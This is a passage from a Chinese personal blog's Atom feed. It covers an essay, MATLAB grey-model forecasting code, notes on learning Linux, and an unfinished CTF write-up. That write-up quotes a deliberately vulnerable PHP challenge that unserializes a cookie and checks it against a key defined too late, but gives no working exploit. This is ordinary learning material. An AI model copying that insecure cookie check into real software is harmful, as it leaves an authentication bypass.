      &lt;h4 id=&quot;起因&quot;&gt;&lt;a href=&quot;#起因&quot; class=&quot;headerlink&quot; title=&quot;起因&quot;&gt;&lt;/a&gt;起因&lt;/h4&gt;&lt;p&gt;回家之后确实颓废了蛮久， 前十天左右都是在忙数模竞赛的事情， 抱着司守奎老师的书啃了半天没看懂讲的是啥。然后回到家之后也挺不适应的， 想想有大概一年没听我妈唠叨了，突然exposed in this situation ， 自然有点令人抓狂。 最令我有点想打人的是， 为啥一到家我的电脑和pad全部罢工， 充不进电！！开始吓坏我了，还以为刚买的就坏了， 后来才之后原来pad这么娇气的呀， 非得用被子裹着， 暖着它， 才肯充进去电。 电脑的问题我也没怎么弄清楚。先放一张图片吧，反正目前能用就行。&lt;br&gt;&lt;img src=&quot;https://upload-images.jianshu.io/upload_images/10651191-1a9d08e07adc86a5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240&quot; alt=&quot;image.png&quot;&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="随笔" scheme="https://prontosil.club/categories/%E9%9A%8F%E7%AC%94/"/>
    
    
  </entry>
  
  <entry>
    <title>flag.php 未完成的wp</title>
    <link href="https://prontosil.club/2019/01/29/flag-php-%E6%9C%AA%E5%AE%8C%E6%88%90%E7%9A%84wp/"/>
    <id>https://prontosil.club/2019/01/29/flag-php-未完成的wp/</id>
    <published>2019-01-29T12:51:54.000Z</published>
    <updated>2019-02-06T11:56:12.405Z</updated>
    
    <content type="html"><![CDATA[<h4 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h4><p>好吧我承认我是看了别人的wp，目前还很菜</p><hr><p>然而我看了wp也不会做。</p><a id="more"></a><h4 id="初探"><a href="#初探" class="headerlink" title="初探"></a>初探</h4><p><img src="https://upload-images.jianshu.io/upload_images/10651191-271a38ff478ea62c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="页面"><br>进去之后是一个什么都点不动的页面。。</p><p>然后有提示 <code>hint</code><br>联系到可能是SQL注入</p><p>于是在URL后面加一个hint参数<br><a href="http://123.206.87.240:8002/flagphp/?hint=1" target="_blank" rel="noopener">http://123.206.87.240:8002/flagphp/?hint=1</a></p><p>得到一串代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">"flag.php"</span>); </span><br><span class="line">$cookie = $_COOKIE[<span class="string">'ISecer'</span>]; </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'hint'</span>]))&#123; </span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">elseif</span> (unserialize($cookie) === <span class="string">"$KEY"</span>) </span><br><span class="line">&#123;    </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"$flag"</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> &#123; </span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line">&lt;html&gt; </span><br><span class="line"></span><br><span class="line">&lt;head&gt; </span><br><span class="line">&lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=UTF-8"</span>&gt; </span><br><span class="line">&lt;title&gt;Login&lt;/title&gt; </span><br><span class="line">&lt;link rel=<span class="string">"stylesheet"</span> href=<span class="string">"admin.css"</span> type=<span class="string">"text/css"</span>&gt; </span><br><span class="line">&lt;/head&gt; </span><br><span class="line">&lt;body&gt; </span><br><span class="line">&lt;br&gt; </span><br><span class="line"></span><br><span class="line">&lt;div class="container" align="center"&gt; </span><br><span class="line">  &lt;form method=<span class="string">"POST"</span> action=<span class="string">"#"</span>&gt; </span><br><span class="line">    &lt;p&gt;&lt;input name=<span class="string">"user"</span> type=<span class="string">"text"</span> placeholder=<span class="string">"Username"</span>&gt;&lt;/p&gt; </span><br><span class="line">    &lt;p&gt;&lt;input name=<span class="string">"password"</span> type=<span class="string">"password"</span> placeholder=<span class="string">"Password"</span>&gt;&lt;/p&gt; </span><br><span class="line">    &lt;p&gt;&lt;input value=<span class="string">"Login"</span> type=<span class="string">"button"</span>/&gt;&lt;/p&gt; </span><br><span class="line">  &lt;/form&gt; </span><br><span class="line">&lt;/div&gt; </span><br><span class="line">&lt;/body&gt; </span><br><span class="line">&lt;/html&gt; </span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">&#125; </span><br><span class="line">$KEY=<span class="string">'ISecer:www.isecer.com'</span>; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="分析代码"><a href="#分析代码" class="headerlink" title="分析代码"></a>分析代码</h4><p>第一句话把报错信息都关掉了<br>然后包含了一个文件flag.php(这不正好是题目的名字？)<br>然后设置cookie<br>额。。<br>然后如果GET得到了hint， 就会把文件的代码都展示出来</p><p>否则如果\$cookie反序列化后得到的结果等于字符串”$KEY”，就会显示flag！</p><h4 id="补充："><a href="#补充：" class="headerlink" title="补充："></a>补充：</h4><p>目前为止这个题目还没做出来。<br>主要是对cookie和serialize这两个不熟悉</p><h5 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h5><p>目前看到一篇 <a href="https://blog.csdn.net/u013982161/article/details/55005542" target="_blank" rel="noopener">cookie详解</a></p><p>到底什么是cookie，怎样才会产生cookie， cookie的作用自不必言。<br>产生cookie有几种方式：<br>server端 的response中包含cookie设置</p><p>脚本方式种植cookie， 主要就是用javascript里的document.cookie对象来实现</p><p>通过在URL栏输入  <code>javascript:alert(document.cookie)</code></p><p>可以查看这个页面的cookie</p><p>当然cookie还有很多 <strong>属性</strong>， 比如为了安全而设置的http only属性， cookie的生存周期等。</p><h5 id="serialize"><a href="#serialize" class="headerlink" title="serialize"></a>serialize</h5><p>serialize() 函数用于序列化对象或数组，并返回一个字符串。<br><strong>serialize()</strong> 函数序列化对象后，可以很方便的将它传递给其他需要它的地方，且其类型和结构不会改变。</p><p>如果想要将已序列化的字符串变回 PHP 的值，可使用 unserialize()</p><p>语法如下：<br><code>string serialize ( mixed $value )</code><br>将其看作一种变化或许可以</p><hr><p>2月6日更新</p><h4 id="更新笔记"><a href="#更新笔记" class="headerlink" title="更新笔记"></a>更新笔记</h4><p>最近在家挺懒散的， 走亲戚实在是太累了， 然后自己又克制不住冲动， 唉要沉下心来刷ctf了</p><h5 id="在线测试平台"><a href="#在线测试平台" class="headerlink" title="在线测试平台"></a>在线测试平台</h5><p><a href="http://www.runoob.com/try/runcode.php?filename=demo_intro&amp;type=php" target="_blank" rel="noopener">PHP在线平台</a></p><p><img src="https://upload-images.jianshu.io/upload_images/10651191-ebe864c8cf103362.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>所以这就是”$KEY” 序列化后的结果。</p><p>其实序列化是有规律可循的， 之前看到过一篇文章但是我忘记链接了。</p><p>不过你看， “$KEY”是一个字符串， 所以是 s，然后是字符串的长度， 最后是字符串的原文。所以， 这里的序列化有问题？？</p><h5 id="关于echo"><a href="#关于echo" class="headerlink" title="关于echo"></a>关于echo</h5><p>经实验得知， php中的echo和Linux bash中的echo很相似</p><h5 id="进一步分析代码"><a href="#进一步分析代码" class="headerlink" title="进一步分析代码"></a>进一步分析代码</h5><p><code>$cookie = $_COOKIE[&#39;ISecer&#39;];</code></p><p>这一步获取到了 服务器预先设定的cookie， 也就是 ISecer: key</p><p><code>unserialize($cookie) === &quot;$KEY&quot;</code></p><p>$cookie 应该是 string类型，  反序列化之后 要和 \$KEY 对应的值相等</p><p>但是题目挖了坑， 在这之前其实我们发现 \$KEY 应该是没定义的。</p><p>且慢， <code>include_once(&quot;flag.php&quot;);</code></p><p>我们不得而知， flag.php文件中是否包含了 对于$KEY 的定义</p><p>这就需要看一下 <code>include_once</code>函数了</p><h5 id="关于include-once函数"><a href="#关于include-once函数" class="headerlink" title="关于include_once函数"></a>关于include_once函数</h5><blockquote><p><em>include_once</em> 语句在脚本执行期间包含并运行指定文件。此行为和 <a href="http://php.net/manual/zh/function.include.php" target="_blank" rel="noopener">include</a> 语句类似，唯一区别是如果该文件中已经被包含过，则不会再次包含。如同此语句名字暗示的那样，只会包含一次。</p></blockquote><p>似乎并没有什么特殊的地方</p><h5 id="未解的谜题"><a href="#未解的谜题" class="headerlink" title="未解的谜题"></a>未解的谜题</h5><p>写到这里其实我还是一无所知， 题目也没有做出来。 但是在深究题目的过程中， 理解了cookie和 serialize 等函数的用法， 算是一桩收获吧</p>]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;写在前面&quot;&gt;&lt;a href=&quot;#写在前面&quot; class=&quot;headerlink&quot; title=&quot;写在前面&quot;&gt;&lt;/a&gt;写在前面&lt;/h4&gt;&lt;p&gt;好吧我承认我是看了别人的wp，目前还很菜&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;然而我看了wp也不会做。&lt;/p&gt;
    
    </summary>
    
      <category term="bugkuctf" scheme="https://prontosil.club/categories/bugkuctf/"/>
    
    
      <category term="cookie" scheme="https://prontosil.club/tags/cookie/"/>
    
      <category term="serialize" scheme="https://prontosil.club/tags/serialize/"/>
    
  </entry>
  
  <entry>
    <title>灰色预测模型</title>
    <link href="https://prontosil.club/2019/01/25/%E7%81%B0%E8%89%B2%E9%A2%84%E6%B5%8B%E6%A8%A1%E5%9E%8B/"/>
    <id>https://prontosil.club/2019/01/25/灰色预测模型/</id>
    <published>2019-01-24T23:45:54.000Z</published>
    <updated>2019-02-03T14:10:12.057Z</updated>
    
    <content type="html"><![CDATA[<ol><li>灾变预测模型<br> <img src="https://upload-images.jianshu.io/upload_images/10651191-6c4e72427c1b4c4d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="数据"><br> 这是某个地区降水量的数据，规定变量zeta &lt; 320为灾年</li></ol><a id="more"></a><p>计算用的matlab程序如下<br><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">clc, clear</span><br><span class="line"><span class="comment">%写出初始数据</span></span><br><span class="line">a=[<span class="number">390.6</span>, <span class="number">412</span>, <span class="number">320</span>, <span class="number">559.2</span>, <span class="number">380.8</span>, <span class="number">542.4</span>, <span class="number">553</span>, <span class="number">310</span>, <span class="number">561</span>, <span class="number">300</span>, <span class="number">632</span>,...</span><br><span class="line"><span class="number">540</span>, <span class="number">406.2</span>, <span class="number">540</span>, <span class="number">406.2</span>, <span class="number">313.8</span>, <span class="number">576</span>, <span class="number">587.6</span>, <span class="number">318.5</span>]';</span><br><span class="line">t0=<span class="built_in">find</span>(a&lt;= <span class="number">320</span>);</span><br><span class="line">n=<span class="built_in">length</span>(t0);</span><br><span class="line"><span class="comment">%做累加运算</span></span><br><span class="line">t1=cumsum(t0);</span><br><span class="line">z1=<span class="number">0.5</span>*t1(<span class="number">1</span>:<span class="keyword">end</span><span class="number">-1</span>)+<span class="number">0.5</span>*t1(<span class="number">2</span>:<span class="keyword">end</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">%求出B矩阵</span></span><br><span class="line">B=[-z1, <span class="built_in">ones</span>(n<span class="number">-1</span>, <span class="number">1</span>)];</span><br><span class="line">Y=t0(<span class="number">2</span>:<span class="keyword">end</span>);</span><br><span class="line"><span class="comment">%左除法</span></span><br><span class="line">r=B\Y;</span><br><span class="line">y=dsolve(<span class="string">'Dy+a*y=b'</span>, <span class="string">'y(0)=y0'</span>);</span><br><span class="line"><span class="comment">%替换变量</span></span><br><span class="line">y=subs(y, &#123;<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'y0'</span>&#125;, &#123;r(<span class="number">1</span>), r(<span class="number">2</span>), t1(<span class="number">1</span>)&#125; );</span><br><span class="line">yucel=subs(y, <span class="string">'t'</span>, [<span class="number">0</span>:n+<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">%为了提高预测精度，先计算预测值，再显示微分方程的解</span></span><br><span class="line">y=vpa(y, <span class="number">6</span>);</span><br><span class="line">yuce=diff(yucel);</span><br><span class="line">yuce=[t0(<span class="number">1</span>), yuce]</span><br><span class="line">yuce_new=yuce(n+<span class="number">1</span>: <span class="keyword">end</span>)</span><br></pre></td></tr></table></figure></p><ol><li>同样的一个类似的预测模型<br> <img src="https://upload-images.jianshu.io/upload_images/10651191-440da227077d102d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="实例计算"></li></ol><p><img src="https://upload-images.jianshu.io/upload_images/10651191-14668ea460255bad.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="数据"></p><p>代码如下<br><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">A=[<span class="number">83.0</span>, <span class="number">79.8</span>,<span class="number">78.1</span>,<span class="number">85.1</span>,<span class="number">86.6</span>,<span class="number">88.2</span>,<span class="number">90.3</span>,<span class="number">86.7</span>,<span class="number">93.3</span>,<span class="number">92.5</span>,<span class="number">90.9</span>,<span class="number">96.9</span>; </span><br><span class="line">    <span class="number">101.7</span>,<span class="number">85.1</span>,<span class="number">87.8</span>,<span class="number">91.6</span>,<span class="number">93.4</span>,<span class="number">94.5</span>,<span class="number">97.4</span>,<span class="number">99.5</span>,<span class="number">104.2</span>,<span class="number">102.3</span>,<span class="number">101.0</span>,<span class="number">123.5</span>; </span><br><span class="line">    <span class="number">92.2</span>,<span class="number">114.0</span>,<span class="number">93.3</span>,<span class="number">101.0</span>,<span class="number">103.5</span>,<span class="number">105.2</span>,<span class="number">109.5</span>,<span class="number">109.2</span>,<span class="number">109.6</span>,<span class="number">111.2</span>,<span class="number">121.7</span>,<span class="number">131.3</span>; </span><br><span class="line">    <span class="number">105.0</span>,<span class="number">125.7</span>,<span class="number">106.6</span>,<span class="number">116.0</span>,<span class="number">117.6</span>,<span class="number">118.0</span>,<span class="number">121.7</span>,<span class="number">118.7</span>,<span class="number">120.2</span>,<span class="number">127.8</span>,<span class="number">121.8</span>,<span class="number">121.9</span>; </span><br><span class="line">    <span class="number">139.3</span>,<span class="number">129.5</span>,<span class="number">122.5</span>,<span class="number">124.5</span>,<span class="number">135.7</span>,<span class="number">130.8</span>,<span class="number">138.7</span>,<span class="number">133.7</span>,<span class="number">136.8</span>,<span class="number">138.9</span>,<span class="number">129.6</span>,<span class="number">133.7</span>; </span><br><span class="line">    <span class="number">137.5</span>,<span class="number">135.3</span>,<span class="number">133.0</span>,<span class="number">133.4</span>,<span class="number">142.8</span>,<span class="number">141.6</span>,<span class="number">142.9</span>,<span class="number">147.3</span>,<span class="number">159.6</span>,<span class="number">162.1</span>,<span class="number">153.5</span>,<span class="number">155.9</span>; </span><br><span class="line">    <span class="number">163.2</span>,<span class="number">159.7</span>,<span class="number">158.4</span>,<span class="number">145.2</span>,<span class="number">124</span>,<span class="number">144.1</span>,<span class="number">157.0</span>,<span class="number">162.6</span>,<span class="number">171.8</span>,<span class="number">180.7</span>,<span class="number">173.5</span>, <span class="number">176.5</span>]; </span><br><span class="line">T=A(<span class="number">1</span>:<span class="number">6</span>, <span class="number">1</span>:<span class="number">12</span>);</span><br><span class="line"><span class="comment">%对前六年求平均</span></span><br><span class="line">x0=<span class="built_in">mean</span>(T');</span><br><span class="line">x1=<span class="built_in">zeros</span>(<span class="built_in">size</span>(x0));</span><br><span class="line">n=<span class="built_in">length</span>(x1);</span><br><span class="line">x1(<span class="number">1</span>)=x0(<span class="number">1</span>);</span><br><span class="line"><span class="comment">%做一次累加求和</span></span><br><span class="line"><span class="keyword">for</span> <span class="built_in">i</span>=<span class="number">2</span>:n</span><br><span class="line">    x1(<span class="built_in">i</span>)=x1(<span class="built_in">i</span><span class="number">-1</span>)+x0(<span class="built_in">i</span>);</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">z=<span class="built_in">zeros</span>(<span class="built_in">size</span>(x0));</span><br><span class="line">af=<span class="number">0.4</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> <span class="built_in">i</span>=<span class="number">2</span>:n</span><br><span class="line">    z(<span class="built_in">i</span>)=af*x1(<span class="built_in">i</span>)+(<span class="number">1</span>-af)*x1(<span class="built_in">i</span><span class="number">-1</span>);</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line">Y=<span class="built_in">zeros</span>(n<span class="number">-1</span>, <span class="number">1</span>);</span><br><span class="line">B=<span class="built_in">zeros</span>(n<span class="number">-1</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">%构造出B和Y矩阵，也就是灰色方程</span></span><br><span class="line"><span class="keyword">for</span> <span class="built_in">i</span>=<span class="number">2</span>:n</span><br><span class="line">    Y(<span class="built_in">i</span><span class="number">-1</span>, <span class="number">1</span>)=x0(<span class="built_in">i</span>);</span><br><span class="line">    B(<span class="built_in">i</span><span class="number">-1</span>, <span class="number">1</span>)=-z(<span class="built_in">i</span>);</span><br><span class="line">    B(<span class="built_in">i</span><span class="number">-1</span>, <span class="number">2</span>)=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="comment">%计算(a, b)'</span></span><br><span class="line">Para=inv(B'*B)*B'*Y;</span><br><span class="line">a=Para(<span class="number">1</span>);</span><br><span class="line">b=Para(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">%预测值</span></span><br><span class="line">Pred=(x0(<span class="number">1</span>)-b/a)*<span class="built_in">exp</span>(-a*n)*(<span class="number">1</span>-<span class="built_in">exp</span>(a));</span><br><span class="line"></span><br><span class="line"><span class="comment">%预测第n+1年的数据</span></span><br><span class="line">Total=<span class="number">12</span>*Pred;</span><br><span class="line"></span><br><span class="line"><span class="comment">%估计各月所占比重</span></span><br><span class="line">r=sum(T)/sum(sum(T));</span><br><span class="line"></span><br><span class="line"><span class="comment">%预测各个月销售量</span></span><br><span class="line">Px=Total*r;</span><br><span class="line">fprintf(<span class="string">'输出203年预测值与实际值.\n'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> <span class="built_in">i</span>=<span class="number">1</span>:<span class="number">12</span></span><br><span class="line">    fprintf(<span class="string">'%5d '</span>, <span class="built_in">i</span>);</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">fprintf(<span class="string">'\n'</span>);</span><br><span class="line"><span class="keyword">for</span> <span class="built_in">i</span>=<span class="number">1</span>:<span class="number">12</span></span><br><span class="line">    fprintf(<span class="string">'%6.1f'</span>, Px(<span class="built_in">i</span>));</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">fprintf(<span class="string">'\n'</span>);</span><br><span class="line"><span class="keyword">for</span> <span class="built_in">i</span>=<span class="number">1</span>:<span class="number">12</span></span><br><span class="line">    fprintf(<span class="string">'%6.1f'</span>, A(<span class="number">7</span>, <span class="built_in">i</span>));</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">fprintf(<span class="string">'\n'</span>);</span><br><span class="line">Error=sum(Px(<span class="number">4</span>:<span class="number">6</span>))-sum(A(<span class="number">7</span>, <span class="number">4</span>:<span class="number">6</span>));</span><br><span class="line">fprintf(<span class="string">'2003年4,5,6月SARS导致减少销售额%6.2f亿元\n'</span>,Error);</span><br><span class="line"><span class="comment">%作图 </span></span><br><span class="line">subplot(<span class="number">2</span>,<span class="number">1</span>,<span class="number">1</span>); </span><br><span class="line">PA=[A(<span class="number">1</span>,:),A(<span class="number">2</span>,:),A(<span class="number">3</span>,:),A(<span class="number">4</span>,:),A(<span class="number">5</span>,:),A(<span class="number">6</span>,:),A(<span class="number">7</span>,:)];</span><br><span class="line"><span class="comment">%变为一行数据 </span></span><br><span class="line"><span class="built_in">plot</span>(PA); </span><br><span class="line">grid on </span><br><span class="line">title(<span class="string">'原始数据'</span>); </span><br><span class="line">subplot(<span class="number">2</span>,<span class="number">1</span>,<span class="number">2</span>); </span><br><span class="line"><span class="built_in">plot</span>(<span class="number">1</span>:<span class="number">12</span>,A(<span class="number">7</span>,:),<span class="string">'b*'</span>,<span class="number">1</span>:<span class="number">12</span>,Px,<span class="string">'r'</span>); </span><br><span class="line">title(<span class="string">'2003年对比数据'</span>); grid on</span><br></pre></td></tr></table></figure></p><p>最后得到的图形为<br><img src="https://upload-images.jianshu.io/upload_images/10651191-d0aa228c70d6f6e2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="结果"></p>]]></content>
    
    <summary type="html">
    
      &lt;ol&gt;
&lt;li&gt;灾变预测模型&lt;br&gt; &lt;img src=&quot;https://upload-images.jianshu.io/upload_images/10651191-6c4e72427c1b4c4d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240&quot; alt=&quot;数据&quot;&gt;&lt;br&gt; 这是某个地区降水量的数据，规定变量zeta &amp;lt; 320为灾年&lt;/li&gt;
&lt;/ol&gt;
    
    </summary>
    
      <category term="数学建模" scheme="https://prontosil.club/categories/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1/"/>
    
    
      <category term="matlab" scheme="https://prontosil.club/tags/matlab/"/>
    
  </entry>
  
  <entry>
    <title>我和Linux的故事</title>
    <link href="https://prontosil.club/2018/12/21/%E6%88%91%E5%92%8CLinux%E7%9A%84%E6%95%85%E4%BA%8B/"/>
    <id>https://prontosil.club/2018/12/21/我和Linux的故事/</id>
    <published>2018-12-21T12:01:44.000Z</published>
    <updated>2019-02-03T14:04:29.280Z</updated>
    
    <content type="html"><![CDATA[<h4 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h4><p>依稀记得是去年这个时候接触到的Linux，当时装了一个Ubuntu的虚拟机，但是没怎么用，虽然感觉和Windows系统很像，但是毕竟不熟练，所以就没怎么关注这个系统，转眼间，Ubuntu系统都已经更新到了18.04LTS版本了。</p><a id="more"></a><p>由于参加ctf比赛的经历让我意识到Linux是一个很重要的操作系统，以后也会和它接触的很多，所以今年的年末不知道怎么心血来潮，开始折腾Linux， docker， git， bash这些工具了。</p><p>先把一些东西记在小本本上:</p><blockquote><p>deb <a href="https://mirrors.ustc.edu.cn/linuxmint/" target="_blank" rel="noopener">https://mirrors.ustc.edu.cn/linuxmint/</a> tara main upstream import backport<br>deb <a href="https://mirrors.ustc.edu.cn/ubuntu/" target="_blank" rel="noopener">https://mirrors.ustc.edu.cn/ubuntu/</a> bionic main restricted universe multiverse<br>deb <a href="https://mirrors.ustc.edu.cn/ubuntu/" target="_blank" rel="noopener">https://mirrors.ustc.edu.cn/ubuntu/</a> bionic-updates main restricted universe multiverse<br>deb <a href="https://mirrors.ustc.edu.cn/ubuntu/" target="_blank" rel="noopener">https://mirrors.ustc.edu.cn/ubuntu/</a> bionic-backports main restricted universe multiverse<br>deb <a href="https://mirrors.ustc.edu.cn/ubuntu/" target="_blank" rel="noopener">https://mirrors.ustc.edu.cn/ubuntu/</a> bionic-security main restricted universe multiverse<br>deb <a href="http://archive.canonical.com/ubuntu/" target="_blank" rel="noopener">http://archive.canonical.com/ubuntu/</a> bionic partner</p></blockquote><p>对，这是Linux mint发行版的镜像源。</p><hr><h5 id="一点小感慨"><a href="#一点小感慨" class="headerlink" title="一点小感慨"></a>一点小感慨</h5><p>第一次接触Linux的感觉已经淡淡消去了， 不过那个时候没有花很多的力气去了解这个操作系统， 直到很多工具在Linux上用的特别顺手的时候才真正的体会到Linux是有多么的好用。 不过就个人来说， Linux确实不适合个人计算机， 我当时就是囿于个人思维， 无法领会到为什么Linux要把文件权限分的那么清楚。不过就计算机发展的早期来说， 多任务， 分时， 支持多个用户的计算机操作系统才是主流， 那会儿都没有个人计算机这个概念呢！</p><h4 id="Linux好用在哪"><a href="#Linux好用在哪" class="headerlink" title="Linux好用在哪"></a>Linux好用在哪</h4><ul><li>apt-get 快速安装自己想要的软件包</li><li>正则表达式方便我们查找文件</li><li>vim编辑器</li><li>管道命令， shell scripts</li><li>各种实用工具</li></ul><h4 id="我能用Linux干什么"><a href="#我能用Linux干什么" class="headerlink" title="我能用Linux干什么"></a>我能用Linux干什么</h4><ul><li>毫无疑问， 管理自己的服务器！只有自己亲自部署一个服务器，然后在本地去远程连接的时候你才知道Linux是多么的有用</li><li>docker虚拟化技术， 使用docker file快速的在云端部署生产环境</li><li>黑客工具箱， kali操作系统(不过我现在很不喜欢这个操作系统了， burp是社区版， ssh服务开启贼麻烦， 想装双系统更是遇到一些神奇的错误)</li><li>管理Linux系统， 维护云端的环境</li><li>目前来看，使用Linux直接编辑代码还有一定的难度， 主要是vim和gcc， gdb这些工具使用的不是很熟悉。不知道怎么调试代码， 缺少GUI的直观</li></ul><h4 id="Linux怎么学"><a href="#Linux怎么学" class="headerlink" title="Linux怎么学"></a>Linux怎么学</h4><p>学Linux真的就像小学学九九乘法口诀表， 不背点东西是啥都不会的。</p><p>Linux好用， 这是对于那些熟悉了命令的人来说，就想乘法也很好算， 但是这是对那些熟悉了乘法表的人来说</p><p>乘法也就是小菜一碟</p><p>所以啊， 学Linux必须要过几关， 一关是bash， shell scripts， 一关是vim编辑器， 还有就是各种命令的常见参数要记得。</p><p>这些， 都要练呀。</p><hr><p>最后修改于2019年2月3日</p>]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;写在前面&quot;&gt;&lt;a href=&quot;#写在前面&quot; class=&quot;headerlink&quot; title=&quot;写在前面&quot;&gt;&lt;/a&gt;写在前面&lt;/h4&gt;&lt;p&gt;依稀记得是去年这个时候接触到的Linux，当时装了一个Ubuntu的虚拟机，但是没怎么用，虽然感觉和Windows系统很像，但是毕竟不熟练，所以就没怎么关注这个系统，转眼间，Ubuntu系统都已经更新到了18.04LTS版本了。&lt;/p&gt;
    
    </summary>
    
      <category term="Linux" scheme="https://prontosil.club/categories/Linux/"/>
    
    
      <category term="Linux" scheme="https://prontosil.club/tags/Linux/"/>
    
      <category term="随笔" scheme="https://prontosil.club/tags/%E9%9A%8F%E7%AC%94/"/>
    
  </entry>
  
  <entry>
    <title>UEFI和legacy</title>
    <link href="https://prontosil.club/2018/12/20/UEFI%E5%92%8Clegacy/"/>
    <id>https://prontosil.club/2018/12/20/UEFI和legacy/</id>
    <published>2018-12-20T11:54:18.000Z</published>
    <updated>2019-02-10T13:39:28.256Z</updated>
    
